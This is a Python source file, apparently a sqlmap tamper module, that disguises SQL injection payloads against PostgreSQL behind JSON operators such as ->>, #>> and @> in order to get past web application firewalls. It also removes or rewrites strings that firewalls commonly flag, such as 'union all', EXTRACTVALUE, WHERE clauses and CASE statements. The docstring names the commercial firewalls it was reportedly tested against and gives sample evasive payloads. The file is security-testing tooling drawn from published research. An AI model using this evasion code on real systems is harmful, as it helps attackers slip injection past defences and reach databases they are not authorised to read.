#!/usr/bin/env python

"""
Copyright (c) 2006-2022 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

# Patterns breaks down SQLi payload into different components, and replaces the logical comparison.
pattern = r"(?i)(?P<pre>.*)\s*\b(?P<relation>AND|OR)\b\s*(?P<leftComponent>\(?\'.*?(?<!\\)(?:\'|\Z)\)?|\(?\".*?(?<!\\)(?:\"|\Z)\)?|\(?\d+(?!x[a-f0-9])\)?)(?P<operator>=|=|like)(?P<rightComponent>\(?\'.*?(?<!\\)(?:\'|\Z)\)?|\(?\".*?(?<!\\)(?:\"|\Z)\)?|\(?\d+(?!x[a-f0-9])\)?)(?P<post>.*)"
pattern_extract_value = r"(?i)(?P<pre>.*)\s*\b(?P<relation>AND|OR)\b\s*(?P<extractValueRest>EXTRACTVALUE.*)"
pattern_when_where = r"(?i)(?P<pre>.*)\s*\b(?P<condition>WHERE|WHEN)\b\s*(?P<rest>.*)"
pattern_replace_case = r"(?i)(?P<all>\(select.*when\s*\((?P<leftComp>.*?)=(?P<rightComp>.*?)\).*?then\s*(?P<firstCase>\(.*?\))\s*else\s*(?P<secondCase>\(.*?\)).*?end\)\))"
import re, random, string

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST


def dependencies():
    pass


# Possible int payloads:
# 1) #>>
# 2) @>
# 3) ->> (index)
# 4) ->> (str)

def generate_int_payload():
    INT_FUNCTIONS = [generate_element_by_id_int_payload, generate_element_by_key_int_payload, generate_element_by_hashtag_int_payload, generate_json_left_contains_payload]
    return (random.choice(INT_FUNCTIONS))()


# Possible str payloads:
# 1) ->> (str)
# 2) ->> (index)
# 3) #>>


def generate_str_payload():
    STR_FUNCTIONS = [generate_element_by_id_str_payload,generate_element_by_key_str_payload, generate_element_by_hashtag_str_payload]
    return (random.choice(STR_FUNCTIONS))()


def generate_random_string(length=15):
    str_length = random.randint(1,length)
    return "".join(random.choice(string.ascii_letters) for i in range(str_length))


def generate_random_int():
    return random.randint(2, 10000)


def generate_element_by_id_payload(isString):
    random_generator = generate_random_string if isString else generate_random_int
    values = []
    for i in range(3):
        values.append(random_generator())
    random_index = random.randint(0,2)
    if isString:
        return f'\'["{values[0]}", "{values[1]}", "{values[2]}"]\'::jsonb->>{random_index} = \'{values[random_index]}\''
    return f"(\'[{values[0]}, {values[1]}, {values[2]}]\'::jsonb->>{random_index})::int8 = {values[random_index]}"


def generate_element_by_id_int_payload():
    return generate_element_by_id_payload(isString=False)


def generate_element_by_id_str_payload():
    return generate_element_by_id_payload(isString=True)


def generate_element_by_key_payload(isString):
    random_generator = generate_random_string if isString else generate_random_int
    keys = []
    values = []
    for i in range(3):
        keys.append(generate_random_string())  # Json must always have a string as a value
        values.append(random_generator())
    random_index = random.randint(0, 2)
    if isString:
        return f"'{{\"{keys[0]}\" : \"{values[0]}\", \"{keys[1]}\" : \"{values[1]}\", \"{keys[2]}\" : \"{values[2]}\"}}'::jsonb->>'{keys[random_index]}' = '{values[random_index]}'"
    return f"('{{\"{keys[0]}\" : {values[0]}, \"{keys[1]}\" : {values[1]}, \"{keys[2]}\" : {values[2]}}}'::jsonb->>'{keys[random_index]}')::int8 = {values[random_index]}"


def generate_element_by_key_int_payload():
    return generate_element_by_key_payload(isString=False)


def generate_element_by_key_str_payload():
    return generate_element_by_key_payload(isString=True)


def generate_element_by_hashtag_payload(isString):
    random_generator = generate_random_string if isString else generate_random_int
    keys = []
    values = []
    for i in range(3):
        keys.append(generate_random_string())  # Json must always have a string as a value
        values.append(random_generator())
    random_index = random.randint(0, 2)
    if isString:
        return f"'{{\"{keys[0]}\" : \"{values[0]}\", \"{keys[1]}\" : \"{values[1]}\", \"{keys[2]}\" : \"{values[2]}\"}}'::jsonb%23>>'{{{keys[random_index]}}}' = '{values[random_index]}'"
    return f"('{{\"{keys[0]}\" : {values[0]}, \"{keys[1]}\" : {values[1]}, \"{keys[2]}\" : {values[2]}}}'::jsonb%23>>'{{{keys[random_index]}}}')::int8 = {values[random_index]}"


def generate_element_by_hashtag_int_payload():
    return generate_element_by_hashtag_payload(isString=False)


def generate_element_by_hashtag_str_payload():
    return generate_element_by_hashtag_payload(isString=True)


def generate_json_left_contains_payload():
    keys = []
    values = []
    for i in range(3):
        keys.append(generate_random_string())  # Json must always have a string as a value
        values.append(generate_random_int())
    random_index = random.randint(0, 2)
    return f"'{{\"{keys[0]}\" : {values[0]}, \"{keys[1]}\" : {values[1]}, \"{keys[2]}\" : {values[2]}}}'::jsonb @> '{{\"{keys[random_index]}\": {values[random_index]}}}'"


def generate_payload(isString, isBrackets):
    payload = '(' if isBrackets else ""
    if isString:
        payload += generate_str_payload()[:-1]  # Do not use the last ' because the application will add it.
    else:
        payload += generate_int_payload()

    return payload


def generate_random_payload():
    if random.randint(0,1):
        return generate_str_payload()
    return generate_int_payload()

def tamper(payload, **kwargs):
    """
    
    Bypasses generic WAFs using JSON SQL Syntax.

    For more details about JSON in PostgreSQL - https://www.postgresql.org/docs/9.3/functions-json.html

    Tested against:
        * PostgreSQL v15.0 - however every version after v9.2 should work

    Usage:
        python3 sqlmap.py <TARGET> --tamper json_waf_bypass_postgres.py

    Notes:

        * References: 
            * https://claroty.com/team82/research/js-on-security-off-abusing-json-based-sql-to-bypass-waf 
            * https://www.blackhat.com/eu-22/briefings/schedule/#js-on-security-off-abusing-json-based-sql-queries-28774
        * Usefull for bypassing any JSON-unaware WAFs with minor-to-no adjusments
        * JSON techniques were tested againts the following WAF vendors:
            * Amazon AWS ELB
            * CloudFlare
            * F5 BIG-IP
            * Palo-Alto Next Generation Firewall
            * Imperva Firewall

        * This script alters the SQLi payload by replacing the condition statement with JSON-specific payloads,
          depending on the SQLi type. Here is a list of supported payload types: (int/string depends on the condition check type)

        Possible int payloads:
            1) #>>
            2) @>
            3) ->> (index)
            4) ->> (str)

        Possible str payloads:
            1) ->> (str)
            2) ->> (index)
            3) #>>

    >>> tamper("' and 5626=9709 and 'kqkk'='kqkk")
    ''' ' and 5626=9709  and '["cyelIKsSqxw", "TjFXJ", "p"]'::jsonb->>1 = 'TjFXJ '''
    >>> tamper('and 4515=8950')
    '''  and ('{"znxqmFaPSFPHbL" : 9783, "thtt" : 3922, "EhFySUTUc" : 2490}'::jsonb%23>>'{thtt}')::int8 = 3922 '''
    """
    payload = payload.replace(r'%20', " ")  # Fix regex for later
    payload = payload.lower().replace("union all", "union")  # Replace union all with union in order to bypass many common WAFs
    bad_string_match = re.search(r"(from \(select \d+)", payload)  # Replaces suffix identified by many WAFs

    if bad_string_match:
        payload = payload[:payload.find(bad_string_match.group(1))] + f"--{generate_random_string()} "

    retVal = payload

    if payload:

        match = re.search(pattern, payload)

        if match:
            pre = match.group('pre')
            # Is our payload a string.
            isString = pre.startswith("'")
            isBrackets = pre.startswith("')") or pre.startswith(")")
            wafPayload = generate_payload(isString=isString, isBrackets=isBrackets)
            retVal = f"{match.group('pre')} {match.group('relation')} {wafPayload}{match.group('post')}"

        elif payload.lower().startswith("' union"):  # Increase evasiveness in union payloads
            wafPayload = generate_random_payload()
            retVal = f"' and {wafPayload} {payload[1:]}"  # replace ' union select... with ' and FALSE_WAF_BYPASS union select...

        else:
            extract_value_match = re.search(pattern_extract_value, payload)

            if extract_value_match:  # Replaces extractvalue because many WAFs target it
                wafPayload = generate_random_payload()
                retVal = f"{extract_value_match.group('pre')} {extract_value_match.group('relation')} {wafPayload} {extract_value_match.group('relation')} {extract_value_match.group('extractValueRest')}"

            else:
                condition_match = re.match(pattern_when_where, payload)

                if condition_match:  # Replaces when/where payloads with regular payloads because many WAFs target this keywords
                    wafPayload = generate_random_payload()
                    retVal = f"{condition_match.group('pre')} {condition_match.group('condition')} {wafPayload} and {condition_match.group('rest')}"

        case_match = re.search(pattern_replace_case, retVal)

        if case_match:  # Replaces case statements because many WAFs target this syntax

            # Check if the case statement expects the left or right option
            if case_match.group("leftComp") == case_match.group("rightComp"):
                retVal = retVal.replace(case_match.group('all'), case_match.group('firstCase'))

            else:
                retVal = retVal.replace(case_match.group('all'), case_match.group('secondCase'))

    return retVal

